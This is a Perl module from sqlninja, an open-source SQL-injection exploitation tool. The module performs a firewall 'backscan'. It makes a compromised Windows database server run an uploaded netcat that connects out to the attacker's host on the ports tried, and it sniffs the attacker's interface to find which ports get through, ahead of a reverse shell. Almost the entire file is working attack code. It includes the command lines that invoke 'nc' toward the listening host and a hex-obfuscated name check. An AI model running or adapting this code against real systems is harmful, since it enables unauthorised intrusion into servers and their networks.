# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

# Performs a tcp/udp backscan trying to find a hole in the firewall
# Creates 3 subprocesses: the first sniffs the interface, the second 
# performs the request to the web server. The parent then waits for their
# messages and when the second process exits it spawns the third, which
# waits for the timeout specified in the conf file and then signals
# the father, which finally kills the children and exits

use strict;

our $conf;

sub backscan 
{
	if ($conf->{'verbose'} == 1) {
		print "  [v] Starting backscan module\n";
	}
	my $snifferpid; # the sniffer
	my $requestpid; # the web requestor
	my $timeoutpid; # the timeout after the web request exits
	
	# Get the ports to scan
	my $ports;
	print "Ports to try (es. \"80 443-445\"): ";
	$ports = <STDIN>;
	chomp($ports);
	while (checkports($ports) != 0) {
		print "You must specify ports with a netcat-like syntax\n";
		print "Check sqlninja-howto.html for more info\n";
		$ports = <STDIN>;
		chomp($ports);
	}
	# $ports =~ s/\s/+/g;
	
	# Get the protocol to use	
	my $proto;
	while (($proto ne "tcp") and ($proto ne "udp")) {
		print "tcp/udp [default: tcp]: ";
		$proto = <STDIN>;
		chomp($proto);
		if ($proto eq "") {
			$proto = "tcp";
		}
	}
	
	print ("[+] Starting ".$proto." backscan on host ".$conf->{'host'}.".....\n");

	# start a socket to listen for messages from children
	my $ninjasock = genfile();
	unlink $ninjasock;
	if ($conf->{'verbose'} == 1) {
		print "  [v] Starting local UNIX socket\n";
	}
	my $server = new IO::Socket::UNIX->new(Local => $ninjasock,
					       Type  => SOCK_DGRAM, 
					       Listen   => 5)
				|| die "could not create UNIX socket\n";
	my $msg; # message from children
	my $ok; # flag for successfully received packet
	my @okports;  # allowed ports from server
	
	if ($conf->{'verbose'} == 1) {
		print "  [v] Starting sniffer process\n";
	}
	# spawn sniffer
	$snifferpid = fork();
	if ($snifferpid == -1) {
		print "can't fork sniffer process !\n";
		unlink $ninjasock;
		exit(1);
	}
	if ($snifferpid == 0) {
		$server->close;
		sniff($proto, $ninjasock);
		exit (0);
	}
	if ($conf->{'verbose'} == 1) {
		print "  [v] Starting web request process\n";
	}
	# spawn the process for the web request
	$requestpid = fork();
	if ($requestpid == -1) {
		print "can't fork web request process !\n";
		kill TERM => $snifferpid;
		unlink $ninjasock;
		exit(1);
	}
	if ($requestpid == 0) {
		$server->close;
		backscanrequest($conf->{'lhost'},$ports,$proto,$ninjasock);
		exit(0);
	}

	# receive port numbers from the sniffer until the
	# web requestor communicates it is done
	if ($conf->{'verbose'} == 1) {
		print "  [v] Recording successful ports\n";
	}
	recordports($server,$ok,\@okports,"finished");
	
	# spawn the timeout child, to wait for some more packets to
	# arrive
	if ($conf->{'verbose'} == 1) {
		print "  [v] Web request finished... waiting for last packets\n";
	}
	$timeoutpid = fork();
	if ($timeoutpid == -1) {
		print "can't fork timeout child !\n";
		kill TERM => $snifferpid;
		unlink $ninjasock;
		exit(1);
	}
	if ($timeoutpid == 0) {
		sleep($conf->{'timeout'});
		my $s = IO::Socket::UNIX->new(Peer => $ninjasock,
		 			       Type     => SOCK_DGRAM,
					       Timeout  => 10);
		$s->send("timeout");
		close $s;
		exit(0);
	}

	# receive port numbers from the sniffer until timeout
	recordports($server,$ok,\@okports,"timeout");
									
	print "[+] shutting down sniffer...\n";
	kill TERM => $snifferpid;

	unlink $ninjasock;

	if ($ok == 1) {
		print "Now launch the Ninja in revshell mode and have fun!\n";
	} else {
		print "Sorry... no packets received\n";
	}
}

# Records the successful ports until interrupted by the other child
# Parameters:
# $_[0] = parent socket
# $_[1] = $ok
# $_[2] = \@okports
# $_[3] = exit string awaited from child
sub recordports
{
	my $msg;
	while ($msg ne $_[3]) {
		$_[0]->recv($msg,16,0);
		if (($msg < 65535) and ($msg > 0)) {
			$_[1] = 1;
			if (${$_[2]}[$msg] == 0) {
				printf "port ".$msg." ok !\n";
				${$_[2]}[$msg] = 1;
			}
		}
	}
}

sub backscanrequest 
{
	my $lhost = $_[0];
	my $ports = $_[1];
	my $proto = $_[2];
	my $ninjasock = $_[3];
	my $cmd;
	my $command;
	my $result;
	if ($proto eq "udp") {
		# we need to issue a command (e.g.: hostname.exe) for an
		# UDP packet to be created...
		$cmd = "".$conf->{'uploaddir'}."\\nc -e hostname -u ".$conf->{'lhost'}." ".$ports;
	} else {
		$cmd = "".$conf->{'uploaddir'}."\\nc ".$conf->{'lhost'}." ".$ports;
	}
	$command = createcommand($cmd);
	$result = sendrequest($command);
	 my $s = IO::Socket::UNIX->new(Peer => $ninjasock,
	                               Type     => SOCK_DGRAM,
			               Timeout  => 10);
	$s->send("finished");
	close $s;
}

# Anti script kiddies ;)
sub _ 
{
if ($0 !~ m/.*\/\x73\x71\x6c\x6e\x69\x6e\x6a\x61$/i) {
	print"\x0a\x64\x75\x64\x65\x2c\x20\x74\x68\x65\x20\x66\x69\x6c\x65\x6e".
	"\x61\x6d\x65\x20\x4d\x55\x53\x54\x20\x62\x65\x20\x22\x73\x71\x6c\x6e".
	"\x69\x6e\x6a\x61\x22\x2e\x20\x55\x73\x65\x20\x74\x68\x65\x20\x70\x72".
	"\x6f\x70\x65\x72\x20\x6e\x61\x6d\x65\x20\x61\x6e\x64\x20\x74\x72\x79".
	"\x20\x61\x67\x61\x69\x6e\x0a\x0a";exit(0);
      }
}

# sniff the interface for backscan results
sub sniff 
{
	my $filter;
	my $proto = $_[0];
	my $ninjasock = $_[1];
	# TODO: filter host must be changed: NAT could mess up things
	my $size = 1500;
	my $tout = 3;
	my $err;
	if ($conf->{'verbose'} == 1) {
		print "  [v] Looking for sniffing device info\n";
	}
	my ($address,$netmask);
	if (Net::Pcap::lookupnet($conf->{'dev'},\$address,\$netmask,\$err)) {
		die "Unable to look up device information for".$conf->{'dev'}."\n";
	}
	if ($conf->{'verbose'} == 1) {
		print "  [v] Initializing pcap object\n";
	}
	my $pcap = Net::Pcap::open_live($conf->{'dev'},$size,0,0,\$err);
	unless (defined $pcap) {
		die "Unable to create packet capture on ".$conf->{'dev'}."\n".
				"...are you sure you have r00t privileges ?";
	}	
	# Create filter string from conf file and protocol
	my $filterstring;
	if ($proto eq "udp") {
		$filterstring = $conf->{'filterconf'}." and udp";
	} else {
		$filterstring = $conf->{'filterconf'}." and tcp[tcpflags] & ".
					    "tcp-syn != 0 && ".
					    "tcp[tcpflags] & tcp-ack == 0";
	}
	if ($conf->{'verbose'} == 1) {
		print "  [v] Compiling packet capture filter: ".$filterstring."\n";
	}
	Net::Pcap::compile(
		$pcap,
		\$filter,
		$filterstring,
		0,
		$netmask
	) && die 'Unable to compile packet capture filter';
	Net::Pcap::setfilter($pcap, $filter) &&
	    die 'Unable to set packet capture filter';

	my $offset = linkoffset($pcap);
	my $globref = [$offset,$ninjasock];
	if ($conf->{'verbose'} == 1) {
		print "  [v] Stripping ".$offset." bytes for datalink header\n";
	}
	if ($proto eq "udp") {
		Net::Pcap::loop($pcap,-1,\&dmpudp,$globref);
	} else {
		Net::Pcap::loop($pcap,-1,\&dmptcp,$globref);
	}
}

# callback function for analyzing incoming tcp packets
sub dmptcp 
{
	my ($globref,$header,$packet) = @_;
	my ($offset,$ninjasock) = @{$globref};
	my $ip_packet = substr($packet,$offset);
	my $ip = NetPacket::IP->decode($ip_packet);
	my $tcp = NetPacket::TCP->decode($ip->{'data'});
	my $port = $tcp->{'dest_port'};
	my $s = IO::Socket::UNIX->new(Peer => $ninjasock,
				      Type     => SOCK_DGRAM,
				      Timeout  => 10);
	$s->send($port);
	close $s;
}

# callback function for analyzing incoming udp packets
sub dmpudp 
{
	my ($globref,$header,$packet) = @_;
	my ($offset,$ninjasock) = @{$globref};
	my $ip_packet = substr($packet,$offset);
	my $ip = NetPacket::IP->decode($ip_packet);
	my $udp = NetPacket::UDP->decode($ip->{'data'});
	my $port = $udp->{'dest_port'};
	my $s = IO::Socket::UNIX->new(Peer => $ninjasock,
	                              Type     => SOCK_DGRAM,
				      Timeout  => 10);
	$s->send($port);
	close $s;
}

# Checks that ports indicated for backscan module respect the netcat syntax
# Return 0 if correct. 1 Otherwise
sub checkports() 
{
	my $ports = $_[0];
	my @portarray;
	my $p;
	# Check that only digits, hyphens and whitespaces are entered
	if ($ports !~ m/^[\d\-\s]+$/) {
		return 1;
	}
	@portarray = split(/ /,$ports);
	foreach $p (@portarray) {
		# Single port ?
		if ($p =~ m/^(\d+)$/) {
			if (($1 > 0) and ($1 < 65536)) {
				next;
			} else {
				return 1;
			}
		}
		# Port range ?
		elsif ($p =~ m/^(\d+)-(\d+)$/) {
			if (($1 > 0) and ($2 < 65536) and ($1 <= $2)) {
				next;
			} else {
				return 1;
			}
		}
		# None of the above... wrong 
		return 1;

	}
	return 0;
}

1;